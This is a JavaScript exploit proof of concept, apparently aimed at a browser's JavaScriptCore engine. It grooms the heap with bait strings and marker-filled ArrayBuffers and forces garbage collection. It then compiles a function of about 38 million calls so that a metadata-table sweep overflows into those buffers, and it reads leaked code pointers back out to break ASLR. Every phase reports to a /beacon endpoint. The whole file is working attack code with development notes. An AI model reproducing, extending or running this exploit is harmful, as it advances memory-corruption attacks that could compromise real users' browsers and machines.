// p464 — MetadataTable forward sweep → ArrayBuffer extraction for ASLR leak
//
// Combines PROVEN p156 bait-and-switch groom with direct AB backing store reads.
// p156 showed JSString .length=81400 but charCodeAt returns bait fill bytes
// because m_data8 still points to original buffer. AB backing stores ARE the
// sweep target and are readable via Uint8Array — no pointer chain.
//
// Per-entry writes (JIT=OFF, 112-byte stride, from finishCreation):
//   +0:  PackedRawSentinelNode (12 bytes, zeros)
//   +12: m_slowPathCount = 0xFFFFFFFF (4 bytes)
//   +24: m_slowPathCallDestination = thunk code address (8 bytes = ASLR LEAK)
//   +64: m_callType bits (4 bytes)
//   +68: m_bytecodeIndex = sequential index 0..38M (4 bytes)
//
// Beacon prefix: V465-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V465-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.length; i++) s += hx(view[off + i]);
    return s;
  }
  function hexPtr(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Bait strings — occupy lower marge pages
  // 100K chars → ~100KB StringImpl → same marge size class as metadata buffer
  // ═══════════════════════════════════════════════════════════
  var N_BAIT = 20;
  var BAIT_LEN = 100000;
  var baits = [];
  var baitPiece = '';
  for (var c = 0; c < 1000; c++) baitPiece += 'B';
  for (var i = 0; i < N_BAIT; i++) {
    var s = '';
    for (var j = 0; j < BAIT_LEN; j += 1000) s += baitPiece;
    s = s.substring(0, BAIT_LEN);
    s.charCodeAt(0);
    baits.push(s);
  }
  baitPiece = null;
  B('BAIT', '' + N_BAIT);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: AB targets — higher addresses, filled with 0xCC
  // Same size as metadata buffer (100,112 bytes) so sweep
  // entries align the same way within each buffer.
  // ═══════════════════════════════════════════════════════════
  var MARKER = 0xCC;
  var AB_SIZE = 100112;
  var N_AB = 30;
  var abList = [];
  var viewList = [];
  for (var i = 0; i < N_AB; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    for (var j = 0; j < v.length; j++) v[j] = MARKER;
    abList.push(ab);
    viewList.push(v);
  }
  B('TARGETS', N_AB + 'x' + AB_SIZE);

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Free baits + GC pressure
  // ═══════════════════════════════════════════════════════════
  for (var i = 0; i < N_BAIT; i++) baits[i] = null;
  baits = null;

  var gcR = 0;
  function gcStep() {
    for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
    for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
    gcR++;
    if (gcR < 30) {
      setTimeout(gcStep, 30);
    } else {
      B('GC', '' + gcR);
      buildOverflow();
    }
  }
  gcStep();

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Build 38M op_call function
  // finishCreation sweeps 4.29GB forward → into AB targets
  // DO NOT call the function (execution crashes on stale entries)
  // ═══════════════════════════════════════════════════════════
  function buildOverflow() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__p465fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p465ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED', window.__p465ok ? 'OK' : 'FAIL');
      setTimeout(scanTargets, 100);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: Scan AB targets for sweep residue
  // ═══════════════════════════════════════════════════════════
  function scanTargets() {
    B('SCAN');
    var hitABs = 0;
    var allPtrs = [];

    for (var ai = 0; ai < viewList.length; ai++) {
      var v = viewList[ai];
      if (!v) continue;

      // Quick hit test: sample every 16 bytes
      var dirty = false;
      for (var j = 0; j < v.length; j += 16) {
        if (v[j] !== MARKER) { dirty = true; break; }
      }
      if (!dirty) continue;
      hitABs++;

      // Find entry alignment via m_slowPathCount = 0xFFFFFFFF at entry+12
      // Try all 112 possible base alignments, pick the one with most hits
      var bestBase = -1, bestN = 0;
      for (var tb = 0; tb < 112; tb++) {
        var n = 0;
        for (var off = tb + 12; off + 4 <= v.length; off += 112) {
          if (u32(v, off) === 0xFFFFFFFF) n++;
        }
        if (n > bestN) { bestN = n; bestBase = tb; }
      }

      if (bestBase < 0 || bestN < 3) {
        // No clear alignment — dump first dirty region
        var fst = -1;
        for (var j = 0; j < v.length; j++) { if (v[j] !== MARKER) { fst = j; break; } }
        if (fst >= 0) B('RAW-' + ai, 'off' + fst + ':' + hexN(v, fst, 224));
        continue;
      }

      B('ALIGN-' + ai, 'base=' + bestBase + ',n=' + bestN);

      // Extract up to 5 thunk pointers + bytecodeIndex values
      var ptrs = [], bcis = [];
      for (var eOff = bestBase; eOff + 80 <= v.length; eOff += 112) {
        if (u32(v, eOff + 12) !== 0xFFFFFFFF) continue;
        ptrs.push(hexPtr(v, eOff + 24));
        bcis.push(u32(v, eOff + 68));
        if (ptrs.length >= 5) break;
      }

      if (ptrs.length > 0) {
        B('PTR-' + ai, ptrs.join(','));
        B('BCI-' + ai, bcis.join(','));
        for (var p = 0; p < ptrs.length; p++) allPtrs.push(ptrs[p]);
      }

      // Dump first valid entry (112 bytes raw hex)
      for (var eOff = bestBase; eOff + 112 <= v.length; eOff += 112) {
        if (u32(v, eOff + 12) === 0xFFFFFFFF) {
          B('ENTRY-' + ai, hexN(v, eOff, 112));
          break;
        }
      }

      if (allPtrs.length >= 10) break;
    }

    // ── Summary ──
    B('SUMMARY', 'hitABs=' + hitABs + ',ptrs=' + allPtrs.length + ',total=' + viewList.length);

    if (allPtrs.length > 0) {
      B('ASLR-LEAK', allPtrs[0]);
      var same = true;
      for (var i = 1; i < allPtrs.length; i++) {
        if (allPtrs[i] !== allPtrs[0]) { same = false; break; }
      }
      B('PTR-CONSISTENT', same ? 'YES-' + allPtrs.length : 'NO-' + allPtrs.join(','));
    } else if (hitABs > 0) {
      B('SWEEP-HIT-NO-ALIGN');
    } else {
      B('NO-HIT');
    }

    B('DONE');
  }
})();
